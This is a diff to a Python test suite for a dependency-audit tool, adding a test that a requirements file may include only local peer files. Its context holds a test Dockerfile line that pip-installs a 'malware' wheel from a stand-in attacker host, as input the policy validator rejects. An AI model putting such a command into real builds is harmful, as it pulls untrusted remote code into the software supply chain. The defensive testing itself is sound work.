@@ -11,6 +11,7 @@ from scripts.production_dependency_audit import (
   validate_dockerfile_policy,
   validate_requirements_policy,
   validate_resolution_report,
+  read_requirements_tree,
 )
 
 
@@ -227,6 +228,18 @@ def test_keeps_the_docker_build_on_the_single_checked_requirements_source():
         "FROM base AS production\nRUN pip install --user malware@https://evil.invalid/malware.whl\n",
       )
     )
+
+
+def test_flattens_only_local_peer_requirement_files(tmp_path):
+  (tmp_path / "base.txt").write_text(REQUIREMENTS, encoding="utf-8")
+  aggregate = tmp_path / "requirements.txt"
+  aggregate.write_text("-r base.txt\n", encoding="utf-8")
+
+  assert "torch==2.13.0+cpu" in read_requirements_tree(aggregate)
+
+  aggregate.write_text("-r ../outside.txt\n", encoding="utf-8")
+  with pytest.raises(AuditPolicyError, match="local peer"):
+    read_requirements_tree(aggregate)
 
 
 def test_removes_inherited_pip_source_and_tls_overrides(monkeypatch):
